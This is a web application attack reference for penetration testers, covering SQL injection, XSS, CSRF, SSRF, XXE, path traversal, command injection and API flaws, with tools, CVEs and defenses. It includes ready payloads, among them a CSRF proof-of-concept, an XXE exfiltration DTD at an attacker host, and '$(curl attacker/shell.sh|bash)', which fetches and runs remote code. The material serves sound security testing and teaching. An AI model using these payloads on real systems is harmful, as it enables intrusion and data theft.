# Web Application Attacks Reference

Index of common web vulnerability classes with quick payloads and tool/CWE references. For deep coverage of each class, see linked references.

**MITRE ATT&CK**: T1190, T1059

---

## SQL Injection (SQLi)

**Deep refs**: [sql-injection-quickstart](../../injection/reference/sql-injection-quickstart.md), [sql-injection-advanced](../../injection/reference/sql-injection-advanced.md) — **A03** — **CWE-89** — **CAPEC-66**

**Types**: in-band (error/UNION), blind (boolean/time), out-of-band (DNS/HTTP).
**Tools**: sqlmap, Burp (Repeater/Intruder/Collaborator), jSQL.

```sql
'                                  -- probe
' OR 1=1--                         -- boolean bypass
admin'--                           -- auth bypass
' UNION SELECT NULL,NULL--         -- union extraction
' AND SLEEP(5)#                    -- time-based blind
'; SELECT pg_sleep(10)--           -- postgres time
```

**Notable CVEs**: CVE-2021-22005, CVE-2019-0193, CVE-2020-28458.
**Defense**: parameterized queries, input allowlist, least-priv DB, ORM, WAF.

---

## Cross-Site Scripting (XSS)

**Deep refs**: [client-side scenarios/xss/](../../client-side/reference/scenarios/xss/), [xss-bypass-techniques](../../client-side/reference/xss-bypass-techniques.md) — **A03** — **CWE-79** — **CAPEC-86**

Reflected / stored / DOM. Tools: XSStrike, Burp XSS Validator, ZAP, BeEF.

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>
javascript:alert(1)
<body onload=alert(1)>
```

Identify reflection points → test contexts (HTML/attr/JS) → bypass via encoding → verify execution.
**Defense**: context-aware output encoding, CSP, HttpOnly+Secure cookies, auto-escaping templates.

---

## Cross-Site Request Forgery (CSRF)

**Deep refs**: [csrf-quickstart](../../client-side/reference/csrf-quickstart.md) — **A01** — **CWE-352** — **CAPEC-62**

**Bypass classes**: token absence/reuse, method downgrade (POST→GET), Referer suppression, SameSite-Lax method-override, sibling-domain XSS.

Methodology: enumerate state-changing endpoints → test token modes (omit/swap/cross-user) → test Referer/Origin → test SameSite → test method override (`_method=POST`) → test cookie injection (CRLF).

**No-protection PoC**:
```html
<form method=POST action=https://target/account/change-email>
  <input type=hidden name=email value=attacker@evil.com>
</form><script>document.forms[0].submit()</script>
```
**SameSite-Lax method-override bypass**: `<script>location='https://target/change-email?email=pwn@evil.com&_method=POST'</script>`
**Cookie-injection bypass**: trigger CRLF via `?search=test%0d%0aSet-Cookie:%20csrf=fake` then submit form with matching token.

**Notable CVEs**: CVE-2020-9484, CVE-2021-3129, CVE-2018-1000600.
**Defense**: session-bound tokens, `SameSite=Strict; Secure; HttpOnly`, Origin/Referer check, custom AJAX header, re-auth for critical actions.

---

## Server-Side Request Forgery (SSRF)

**Deep refs**: [server-side INDEX](../../server-side/reference/INDEX.md) → `scenarios/ssrf/` — **A10** — **CWE-918** — **CAPEC-664**

**Vulnerable params**: `url`, `uri`, `path`, `redirect`, `fetch`, `stockApi`, `callback`, `webhook`, `logo_uri`.
**Tools**: Burp Collaborator, SSRFmap, Gopherus, ffuf.

```
http://127.0.0.1/ • http://127.1/ • http://[::1]/
http://2130706433/ • http://0x7f000001/        # decimal/hex
http://169.254.169.254/latest/meta-data/        # AWS IMDS
gopher://127.0.0.1:6379/_KEYS%20*               # Redis
file:///etc/passwd
```

**Bypasses**: case mix, `http://localhost@trusted.com/`, fragment encoding (`localhost:80%2523@trusted.com`), DNS A→`0.0.0.0`, double-encode (`%2561dmin`), open-redirect chain.

**Notable CVEs**: CVE-2021-21972 (vCenter, 9.8), CVE-2020-13379 (Grafana), CVE-2025-61882 (Oracle EBS, 9.8).
**Defense**: host allowlist, block private/link-local, IMDSv2, disable file/gopher/dict, sanitize errors.

---

## Authentication Bypass

**Deep refs**: [authentication-quickstart](../../authentication/reference/authentication-quickstart.md) — **A07** — **CWE-287** — **CAPEC-114**

Common flaws: defaults, weak policy, login SQLi, session fixation, OAuth misconfig, MFA logic gaps. Tools: Burp Intruder, Hydra.

Methodology: defaults → username enum → password reset abuse → token analysis → SQLi in login → MFA bypass → IDOR on auth endpoints.

```
admin' OR '1'='1'--                          # SQLi auth bypass
username=admin&password=x&authenticated=true  # logic param tamper
```

**Defense**: strong policy + lockout + MFA + rate-limit, secure reset, regenerate session on auth.

---

## XML External Entity (XXE)

**Deep refs**: [xxe-quickstart](../../injection/reference/xxe-quickstart.md), [xxe-cheat-sheet](../../injection/reference/xxe-cheat-sheet.md) — **A05** — **CWE-611** — **CAPEC-221**

Tools: Burp Pro + Collaborator, XXEinjector, dtd-finder.

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Out-of-band exfil via external DTD -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>
```

**Defense**: disable DTD/external entities, prefer JSON, schema allowlist.

---

## Insecure Deserialization

**Deep refs**: [insecure-deserialization-resources](../../server-side/reference/insecure-deserialization-resources.md) — **A08** — **CWE-502** — **CAPEC-586**

Affected: Java, PHP, Python (`pickle`), .NET, Ruby. Tools: ysoserial, phpggc, Burp Java Deserialization Scanner.

Methodology: identify serialized blobs → fingerprint format → generate gadget chain → verify side effect (DNS/sleep) before RCE.

**Notable CVEs**: CVE-2015-4852 (WebLogic), CVE-2017-5638 (Struts).
**Defense**: avoid native deserialization of untrusted data, prefer JSON, HMAC integrity, class allowlist.

---

## Path Traversal

**Deep refs**: [server-side INDEX](../../server-side/reference/INDEX.md) → `scenarios/path-traversal/` — **A01** — **CWE-22** — **CAPEC-126**

Tools: Burp Intruder, DotDotPwn.

```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd                      # nested-replacement bypass
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd               # double-encoded
```

**Defense**: file allowlist, canonicalize + prefix-check, chroot/jail.

---

## Remote Code Execution (RCE)

**Deep refs**: [os-command-injection-cheat-sheet](../../injection/reference/os-command-injection-cheat-sheet.md) — **A03** — **CWE-78 / CWE-94** — **CAPEC-88**

Vectors: command injection, deserialization, SSTI, file upload, file inclusion. Tools: Commix, Weevely.

```bash
; ls -la
| whoami
`id`
$(curl attacker/shell.sh|bash)
```
```python
{{config.items()}}                              # SSTI Jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
```

**Notable CVEs**: CVE-2021-44228 (Log4Shell), CVE-2022-22965 (Spring4Shell).
**Defense**: avoid shell exec, parameterized APIs, input allowlist, sandbox/container, least-priv.

---

## API Security

**Deep refs**: [api-security skill](../../api-security/SKILL.md) — **OWASP API Top 10** — **CWE-639 / CWE-918**

Common issues: BOLA/IDOR, broken auth, excessive data exposure, no rate-limit, mass assignment, misconfig. Tools: Postman, Burp, ZAP, Arjun, ffuf.

Methodology: enumerate endpoints (incl. hidden via Arjun) → test authn → test authz per resource+method → fuzz params/methods → measure rate limits → inspect responses for over-disclosure → test mass assignment (extra fields `role`, `is_admin`).

**Defense**: object-level authz on every resource, schema validation, rate limit, response field allowlist, API gateway.
